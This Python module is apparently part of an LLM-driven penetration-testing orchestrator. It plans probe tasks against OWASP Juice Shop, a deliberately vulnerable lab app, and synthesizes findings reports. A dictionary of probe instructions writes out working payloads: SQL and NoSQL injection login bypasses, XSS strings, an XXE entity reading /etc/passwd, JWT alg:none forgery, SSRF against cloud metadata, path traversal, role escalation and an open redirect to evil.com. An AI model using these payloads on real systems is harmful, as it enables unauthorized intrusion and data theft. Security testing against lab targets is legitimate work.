"""
tools/coven/alakazam.py
=======================
AlakazamMasterCoordinator — LLM-powered attack planner with JuiceShop-
specific task builders and report synthesizer.

Extracted from sabrina_coven_orchestrator_LAB.py (AlakazamMasterCoordinator
+ _build_surface_tasks + _build_surface_tasks_DISABLED + synthesize_report).
"""

import os
import re
import json
from typing import List, Dict, Any, Optional

from .shared import (
    C, OLLAMA_PLANNER_MODEL, GEMINI_KEY, GEMINI_MODEL,
    _ollama_chat,
)

# ---------------------------------------------------------------------------
# Juiceshop-specific VULN_PROBES (curated hand-written task briefs).
# These are used when the LLM fallback fires — every endpoint+vuln_type combo
# maps to a concrete, grounded probe instruction rather than a generic one.
# ---------------------------------------------------------------------------
JUICESHOP_VULN_PROBES: Dict[str, List[Dict[str, Any]]] = {
    "sqli": [
        {
            "path": "/rest/user/login", "method": "POST",
            "instructions": (
                "POST JSON to /rest/user/login with {\"email\": \"' OR 1=1--\", \"password\": \"x\"}. "
                "Check if response contains authentication.token (SQLi login bypass). "
                "Also try: {\"email\": \"admin'--\", \"password\": \"x\"}. "
                "Print SABRINA_FINDING:<json> if token returned."
            ),
        },
        {
            "path": "/api/Products", "method": "GET",
            "instructions": (
                "GET /api/Products?q=apple')%20OR%20'1'%3D('1. "
                "Check if all products including deleted are returned. "
                "Print SABRINA_FINDING:<json> if row count changes vs baseline."
            ),
        },
        {
            "path": "/rest/track-order", "method": "GET",
            "instructions": (
                "GET /rest/track-order?id=' OR 1=1-- and variants. "
                "Check for SQL error messages or unexpected order data. "
                "Print SABRINA_FINDING:<json> if SQLi indicators found."
            ),
        },
    ],
    "xss": [
        {
            "path": "/api/Users", "method": "POST",
            "instructions": (
                "POST to /api/Users (register) with username field: "
                "<script>alert(1)</script> and \"><img src=x onerror=alert(1)>. "
                "Then GET /api/Users and check if payload reflected unescaped. "
                "Print SABRINA_FINDING:<json> if reflected."
            ),
        },
        {
            "path": "/api/Feedbacks", "method": "POST",
            "instructions": (
                "POST to /api/Feedbacks with comment: "
                "<iframe src=javascript:alert(1)>. "
                "GET /api/Feedbacks and check if payload reflected unescaped. "
                "Print SABRINA_FINDING:<json> if confirmed."
            ),
        },
    ],
    "idor": [
        {
            "path": "/rest/basket", "method": "GET",
            "instructions": (
                "GET /rest/basket/1 and /rest/basket/2 with admin JWT. "
                "Check if you can read another user's basket. "
                "A 200 with basket data for a different user = IDOR. "
                "Print SABRINA_FINDING:<json> with the other user's basket data."
            ),
        },
        {
            "path": "/api/Users", "method": "GET",
            "instructions": (
                "GET /api/Users — admin-only endpoint. "
                "Re-test as a regular user: POST /api/Users to register, login, get JWT. "
                "Then GET /api/Users with that JWT. If non-admin can list all users = IDOR. "
                "Print SABRINA_FINDING:<json> if confirmed."
            ),
        },
    ],
    "auth_bypass": [
        {
            "path": "/rest/user/login", "method": "POST",
            "instructions": (
                "Try: POST {\"email\":\"' OR 1=1--\",\"password\":\"x\"}. "
                "Also try email=admin@juice-sh.op with empty password. "
                "Print SABRINA_FINDING:<json> if authentication.token returned without valid password."
            ),
        },
    ],
    "session": [
        {
            "path": "/rest/user/login", "method": "POST",
            "instructions": (
                "Login and get JWT. Decode the JWT header. Try alg:none attack: "
                "forge a token with {alg:none} header and admin role, empty signature. "
                "Send request with forged token. Print SABRINA_FINDING:<json> if accepted."
            ),
        },
    ],
    "privilege_escalation": [
        {
            "path": "/api/Users", "method": "PUT",
            "instructions": (
                "Register: POST /api/Users {\"email\":\"hacker@x.com\",\"password\":\"Hacker1!\",\"passwordRepeat\":\"Hacker1!\"}. "
                "Login to get their JWT and user ID. "
                "Then: PUT /api/Users/{id} with body {\"role\":\"admin\"} and their JWT. "
                "Print SABRINA_FINDING:<json> if role escalation confirmed."
            ),
        },
    ],
    "path_traversal": [
        {
            "path": "/ftp", "method": "GET",
            "instructions": (
                "GET /ftp/ to list files. Try: /ftp/coupons_2013.md.bak, /ftp/package.json.bak, "
                "/ftp/acquisitions.md. Also try /ftp/%2500.md to bypass extension filters. "
                "Print SABRINA_FINDING:<json> with file contents as evidence."
            ),
        },
    ],
    "open_redirect": [
        {
            "path": "/redirect", "method": "GET",
            "instructions": (
                "GET /redirect?to=https://evil.com and /redirect?to=//evil.com. "
                "Check if response is a 302/301 to evil.com. "
                "Print SABRINA_FINDING:<json> if redirect to external domain confirmed."
            ),
        },
    ],
    "xxe": [
        {
            "path": "/b2b/v2/orders", "method": "POST",
            "instructions": (
                "POST to /b2b/v2/orders with Content-Type: application/xml and body: "
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                "<order><orderLinesData>&xxe;</orderLinesData></order>. "
                "Check if /etc/passwd in response. Print SABRINA_FINDING:<json> if file contents returned."
            ),
        },
    ],
    "deserialization": [
        {
            "path": "/b2b/v2/orders", "method": "POST",
            "instructions": (
                "POST to /b2b/v2/orders with body: "
                "{\"orderLinesData\": \"[{\\\"productId\\\": 12, \\\"quantity\\\": 1}\"}. "
                "Also try {\"__proto__\": {\"polluted\": \"yes\"}}. "
                "Print SABRINA_FINDING:<json> if server error reveals deserialization stack trace."
            ),
        },
    ],
    "injection": [
        {
            "path": "/rest/user/login", "method": "POST",
            "instructions": (
                "Try NoSQL injection: POST {\"email\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}. "
                "Also: {\"email\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}. "
                "Print SABRINA_FINDING:<json> if login succeeds without valid credentials."
            ),
        },
    ],
    "ssrf": [
        {
            "path": "/api/Products", "method": "POST",
            "instructions": (
                "POST to /api/Products with body {\"image\": \"http://169.254.169.254/latest/meta-data/\", "
                "\"name\": \"x\", \"price\": 1}. "
                "Check if response contains AWS metadata. "
                "Print SABRINA_FINDING:<json> if internal data in response."
            ),
        },
    ],
    "broken_authentication": [
        {
            "path": "/rest/user/login", "method": "POST",
            "instructions": (
                "Test rate-limiting bypass: send 100 rapid login attempts with wrong password. "
                "Also test account enumeration: POST valid email vs nonexistent email, compare error messages. "
                "Print SABRINA_FINDING:<json> if rate limiting absent or user enumeration possible."
            ),
        },
    ],
    "sensitive_data_exposure": [
        {
            "path": "/api/Users", "method": "GET",
            "instructions": (
                "GET /api/Users with admin JWT. Check if password hashes, security answers, "
                "or other sensitive fields are exposed in the response. "
                "Print SABRINA_FINDING:<json> if sensitive data returned."
            ),
        },
    ],
    "broken_access_control": [
        {
            "path": "/administration", "method": "GET",
            "instructions": (
                "GET /administration without admin JWT, then with regular user JWT. "
                "Check if admin panel is accessible to non-admin. "
                "Print SABRINA_FINDING:<json> if admin content returned to non-admin."
            ),
        },
    ],
    "security_misconfiguration": [
        {
            "path": "/api/Feedbacks", "method": "DELETE",
            "instructions": (
                "Try DELETE /api/Feedbacks/1 without authorization. "
                "Also try PUT /api/Feedbacks/1 to edit another user's feedback. "
                "Print SABRINA_FINDING:<json> if unauthorized modification allowed."
            ),
        },
    ],
    "cryptographic_issues": [
        {
            "path": "/rest/user/login", "method": "POST",
            "instructions": (
                "Login normally. Decode the JWT and check: "
                "Is alg HS256/RS256? Is exp far in the future? "
                "Try changing alg to 'none' and removing signature. "
                "Print SABRINA_FINDING:<json> if weak crypto or token accepted."
            ),
        },
    ],
}


class AlakazamMasterCoordinator:
    """
    LLM-powered attack planner.
    Reads scope + discovered attack surface from Blackboard and produces a
    prioritised JSON task list. Falls back to JuiceShop-specific curated
    probes when the LLM JSON parse fails.
    """

    def __init__(self, router: Optional[Any] = None):
        self.using_gemini     = bool(GEMINI_KEY)
        self.model            = GEMINI_MODEL if self.using_gemini else OLLAMA_PLANNER_MODEL
        self.router           = router
        self._blackboard_ref  = None  # set by orchestrator after init

    def query(self, system: str, user: str, max_tokens: int = 2048) -> str:
        if self.router:
            return self.router.route(system, user, max_tokens, task_type="planner")
        return _ollama_chat(system, user, max_tokens=max_tokens, model=self.model)

    # ── Main planner entry ────────────────────────────────────────────────────

    def plan_attack(self, policy: "ScopePolicy",
                    creds: Optional[Any] = None,
                    max_tasks: int = 30,
                    blackboard: Optional[Any] = None) -> List[Dict[str, Any]]:
        if blackboard:
            self._blackboard_ref = blackboard

        in_scope_sample = policy.in_scope[:4]
        base_url = (
            policy.in_scope[0].rstrip("/") if policy.in_scope else "http://localhost:3000"
        )
        if not base_url.startswith("http"):
            base_url = f"http://{base_url}"

        # Pull discovered surface from Blackboard
        bb = self._blackboard_ref
        surface = bb.get_attack_surface() if bb else []
        _SPA_SHELLS = {'/', '/login', '/register', '/accounting', '/profile', '/engine.io'}
        if bb and surface:
            def _worth(ep):
                path = ep.get('path', '')
                if path in _SPA_SHELLS:
                    return False
                bl = bb.get_baseline(path)
                if bl:
                    if bl.get('status', 200) == 500:
                        return False
                    if not ep.get('params') and bl.get('resp_size', 0) > 20000:
                        return False
                return True
            surface_filtered = sorted(
                [ep for ep in surface if _worth(ep)],
                key=lambda ep: 0 if (ep['path'].startswith('/api/') or ep['path'].startswith('/rest/')) else 1
            )
        else:
            surface_filtered = surface

        if surface_filtered:
            ep_lines = []
            for ep in surface_filtered[:8]:
                params = ", ".join(ep.get('params', [])) or 'none'
                ep_lines.append(f"  {ep['method']} {ep['path']} (params: {params})")
            surface_block = "Endpoints:\n" + "\n".join(ep_lines) + "\n"
        else:
            surface_block = ""

        _has_auth = bool(bb and bb.get_auth_token(base_url))
        _auth_context = ""
        if _has_auth:
            _auth_context = (
                "NOTE: Authentication is AVAILABLE — admin JWT is stored.\n"
                "Set requires_auth=true for endpoints that require a logged-in user.\n"
            )

        prompt = (
            f"Target: {base_url}\n"
            f"Vulns to test: {', '.join(policy.focus[:10])}\n"
            f"{_auth_context}"
            f"{surface_block}"
            f"Output a JSON array of up to {min(max_tasks, 12)} probe tasks. "
            f"Schema: id, priority(int 1-3), target(FULL URL e.g. {base_url}/api/X), "
            f"vuln_type, worker_role(Probe-Ant), product, instructions(one sentence), "
            f"requires_auth(bool), estimated_payout(string). "
            "IMPORTANT: target must be a FULL URL. Do NOT use relative paths. "
            "Do NOT embed payloads in target. Each task must test a DIFFERENT endpoint+vuln_type pair. "
            "Output ONLY the JSON array, no markdown."
        )

        raw = self.query("Output only a valid JSON array. No markdown.", prompt)
        clean = re.sub(r"^```(?:json)?\s*|\s*```$", "", raw.strip())
        _m = re.search(r'\[.*?\]', clean, re.DOTALL)
        if _m:
            clean = _m.group(0)
        if '[' in clean and not clean.rstrip().endswith(']'):
            _last_close = clean.rfind('}')
            if _last_close != -1:
                clean = clean[:_last_close + 1] + ']'
            else:
                clean = clean.rstrip().rstrip(',') + ']'
        try:
            tasks = json.loads(clean)
            if isinstance(tasks, list) and tasks:
                _PAYLOAD_SIGNS = ("'", '">',  '<script', 'alert(', 'onerror', 'DROP ', '; --', 'evil.com')
                _clean_tasks = []
                for t in tasks:
                    tgt = t.get('target', '')
                    if any(sig in tgt for sig in _PAYLOAD_SIGNS):
                        print(f"  {C.Y}[ALAKAZAM] Dropped task with payload in target: {tgt[:80]}{C.X}")
                        continue
                    _clean_tasks.append(t)
                tasks = _clean_tasks
                for t in tasks:
                    tgt = t.get('target', '')
                    if tgt.startswith('/'):
                        t['target'] = base_url + tgt
                tasks = self._build_recon_tasks(policy) + tasks
                print(f"  {C.G}[ALAKAZAM] Attack plan: {len(tasks)} tasks generated.{C.X}")
                return tasks
        except Exception as je:
            print(f"  {C.Y}[ALAKAZAM] JSON parse failed ({je}). Falling back to surface task builder.{C.X}")

        return self._build_surface_tasks(policy, creds)

    # ── Recon tasks ───────────────────────────────────────────────────────────

    def _build_recon_tasks(self, policy: "ScopePolicy") -> List[Dict[str, Any]]:
        tasks = []
        for i, host in enumerate(policy.in_scope):
            target = host if host.startswith("http") else f"http://{host}"
            tasks.append({
                "id":           f"recon-{i:04d}",
                "priority":     0,
                "target":       target,
                "vuln_type":    "recon",
                "worker_role":  "Recon-Ant",
                "product":      "generic",
                "instructions": (
                    "Run full three-layer infrastructure mapping: "
                    "fingerprint headers, crawl JS bundles for API paths, "
                    "check OIDC and CORS trust boundaries."
                ),
                "requires_auth": False,
                "estimated_payout": "N/A",
            })
        return tasks

    # ── Surface task builder (fallback) ──────────────────────────────────────

    def _build_surface_tasks(self, policy: "ScopePolicy",
                             creds: Optional[Any] = None) -> List[Dict[str, Any]]:
        tasks = self._build_recon_tasks(policy)
        bb = self._blackboard_ref
        surface = bb.get_attack_surface() if bb else []
        base_url = (
            policy.in_scope[0].rstrip("/") if policy.in_scope else "http://localhost:3000"
        )
        if not base_url.startswith("http"):
            base_url = f"http://{base_url}"

        payout = "$7000-$35000"
        tid = 0
        seen_combos: set = set()

        for vuln_type in policy.focus:
            probes = JUICESHOP_VULN_PROBES.get(vuln_type, [])
            # If we have grounded probes, use them
            if probes:
                for probe in probes:
                    path  = probe["path"]
                    combo = (vuln_type, path)
                    if combo in seen_combos:
                        continue
                    seen_combos.add(combo)
                    tasks.append({
                        "id":               f"task-{tid:04d}",
                        "priority":         1,
                        "target":           base_url + path,
                        "vuln_type":        vuln_type,
                        "worker_role":      "Probe-Ant",
                        "product":          "juiceshop",
                        "instructions":     probe["instructions"],
                        "requires_auth":    vuln_type in {
                            "idor", "privilege_escalation", "session",
                            "auth_bypass", "broken_authentication",
                            "sensitive_data_exposure", "broken_access_control",
                        },
                        "estimated_payout": payout,
                    })
                    tid += 1
            else:
                # Generic surface cross-product
                for ep in surface:
                    combo = (ep["path"], vuln_type)
                    if combo in seen_combos:
                        continue
                    seen_combos.add(combo)
                    tasks.append({
                        "id":               f"task-{tid:04d}",
                        "priority":         1,
                        "target":           base_url + ep["path"],
                        "vuln_type":        vuln_type,
                        "worker_role":      "Probe-Ant",
                        "product":          "generic",
                        "instructions":     (
                            f"Test {ep.get('method','GET')} {ep['path']} for {vuln_type}. "
                            f"Params: {ep.get('params',[])}. "
                            "Print SABRINA_FINDING:<json> if vulnerability confirmed."
                        ),
                        "requires_auth":    False,
                        "estimated_payout": payout,
                    })
                    tid += 1

        print(f"  {C.G}[ALAKAZAM] Surface fallback: {len(tasks)} tasks generated.{C.X}")
        return tasks

    # ── Report synthesis ──────────────────────────────────────────────────────

    def synthesize_report(self, policies: List["ScopePolicy"],
                          blackboard: Any) -> str:
        findings      = blackboard.get_findings()
        log_tail      = "\n".join(blackboard.get_log().splitlines()[-60:])
        scope_summary = "\n".join(p.summary() for p in policies)

        if not findings:
            print(f"  {C.Y}[ALAKAZAM] No confirmed findings — generating recon/next-steps report.{C.X}")
            return self._no_findings_report(scope_summary, log_tail)

        by_sev: Dict[str, List] = {
            "critical": [], "high": [], "medium": [], "low": [], "info": []
        }
        for f in findings:
            sev = f.get("severity", "info").lower()
            by_sev.setdefault(sev, []).append(f)

        findings_json = json.dumps(findings, indent=2)
        prompt = (
            f"You are a senior penetration tester writing a professional vulnerability report.\n\n"
            f"Program:\n{scope_summary}\n\n"
            f"Confirmed findings ({len(findings)} total):\n"
            f"Critical: {len(by_sev['critical'])} | High: {len(by_sev['high'])} | "
            f"Medium: {len(by_sev['medium'])} | Low: {len(by_sev['low'])}\n\n"
            f"Raw findings:\n{findings_json}\n\n"
            f"Worker log (last 60 entries):\n{log_tail}\n\n"
            f"Write a professional Markdown report with:\n"
            f"1. Executive Summary\n"
            f"2. Findings table: | Severity | Vuln Type | Target | Description |\n"
            f"3. Per-finding write-up: Description, Business Impact, PoC Steps, Remediation\n\n"
            f"STRICT RULES:\n"
            f"- Only report findings from the data above. Do NOT invent findings.\n"
            f"- Output only Markdown."
        )
        return self.query(
            "You are an expert security researcher writing a professional report.",
            prompt, max_tokens=4096
        )

    def _no_findings_report(self, scope_summary: str, log_tail: str) -> str:
        prompt = (
            f"Program:\n{scope_summary}\n\n"
            f"Worker log:\n{log_tail}\n\n"
            f"Result: No confirmed vulnerabilities found.\n\n"
            f"Write a Markdown report with:\n"
            f"1. Executive Summary\n"
            f"2. Attack surface map\n"
            f"3. Recommended manual follow-up tests\n\n"
            f"Output only Markdown."
        )
        return self.query(
            "Senior bug bounty researcher writing a recon report with no confirmed findings.",
            prompt, max_tokens=1500
        )
